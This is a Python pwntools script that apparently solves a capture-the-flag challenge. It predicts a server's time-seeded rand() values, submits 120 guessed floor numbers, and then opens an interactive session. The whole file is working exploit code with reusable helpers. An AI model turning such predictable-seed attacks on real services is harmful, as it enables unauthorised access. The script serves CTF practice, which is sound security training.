import time
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack

# io = remote("192.168.170.128", 9997)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
io = remote("node5.anna.nssctf.cn", 28286)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./bin')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
# context(os='linux', arch='i386', log_level="debug")


libc = cdll.LoadLibrary("libc.so.6")
libc.srand(libc.time(0))
rand_result = libc.rand()
libc.srand(rand_result % 3 - 1522127470)

io.recvuntil('killed by a trap.\n')
for i in range(120):

    rand_r = libc.rand() % 4 + 1

    ru('Floor')
    sl(str(rand_r))

inter()